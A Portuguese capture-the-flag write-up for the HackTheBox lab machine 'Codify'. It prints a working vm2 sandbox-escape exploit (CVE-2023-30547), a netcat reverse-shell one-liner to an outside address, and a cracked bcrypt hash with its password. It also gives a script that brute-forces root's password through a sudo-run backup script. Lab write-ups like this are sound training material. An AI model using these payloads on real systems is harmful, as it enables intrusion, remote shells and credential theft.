# ****Codify****

# * Scan de portas

```bash
rustscan -a 10.10.11.239
```
![image](https://github.com/lufffe/Writeups/assets/90646635/afcb64c2-4550-489e-a6dc-31ce326e66a4)

![image](https://github.com/lufffe/Writeups/assets/90646635/91f7acaf-292b-4f73-b9db-12180b4dc143)

```bash
nmap -A -p 22,80,3000,8000 10.10.11.239
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0ab41429-850a-47ad-82ba-92002ea52d3f)

# * Scan de Arquivos e Diretórios

```bash
gobuster dir -u http://codify.htb/ -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2f5f0dac-e3e3-4502-bbd4-71b768d4d064)



## Achei a informação que tinha a biblioteca Vm2 e resolvi procurar falhas
![image](https://github.com/lufffe/Writeups/assets/90646635/ed3ccbfb-1e2f-4f98-8574-0d7be4c78bdc)

https://vk9-sec.com/cve-2023-30547exploitation-node-js-vm2-module-code-execution-rce/

<aside>
💡 http://codify.htb/editor
</aside>

![image](https://github.com/lufffe/Writeups/assets/90646635/f1b32fd3-c167-4f86-bf9d-9ab8d90c0765)

## Script usado para pegar o RCE

```jsx
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```

<aside>
💡 REVERSE SHELL

</aside>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.202 4455 >/tmp/f
```

## Full TTy

python3 -c 'import pty;pty.spawn("/bin/bash")’

![image](https://github.com/lufffe/Writeups/assets/90646635/467c4303-8eb4-44de-ae39-9bfed11426ef)

## Encontrado um arquivo db com uma credencial de usuário

svc@codify:/var/www/contact$

```bash
cat tickets.db
```

joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
![image](https://github.com/lufffe/Writeups/assets/90646635/754ddf1a-9fad-4b9f-a9df-c1cc67e4056c)

## Descobrindo a senha

```bash
john --wordlist=rockyou.txt hash.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4c324249-7f04-4213-b243-88af541b2a34)

<aside>
💡 spongebob1
</aside>

# Logando pelo ssh e pegando a flag User

```bash
ssh joshua@10.10.11.239
```

# Buscando como escalar previlégios

```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6d6e6fb3-c061-4a41-878f-2180aa15b047)

![image](https://github.com/lufffe/Writeups/assets/90646635/c905d176-4603-4aa0-b0fe-42db288d1b93)

## Nesse trecho do codigo ele faz comparação da senha digitada com a senha do root
![image](https://github.com/lufffe/Writeups/assets/90646635/0206232a-3b2d-4d4e-81a9-5122c217c861)

### Código executado para achar a senha

```python
import string
import subprocess

def check_password(p):
command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return "Password confirmed!" in result.stdout
charset = string.ascii_letters + string.digits
password = ""
is_password_found = False
while not is_password_found:
for char in charset:
if check_password(password + char):
password += char
print(password)
break
else:
is_password_found = True
```

## Executando o script

```bash
python3 [script.py](http://script.py/)
```
![image](https://github.com/lufffe/Writeups/assets/90646635/fdf8a888-0b62-461f-8cc7-4b299f66557c)

> kljh12k3jhaskjh12kjh3

```python
sudo /opt/scripts/mysql-backup.sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5dd242e5-a340-4d03-a693-be58960b17f6)

# * Logando com o usuario root e pegando a flag
![image](https://github.com/lufffe/Writeups/assets/90646635/fdd5e527-db51-4501-9a68-1f25aaf49662)
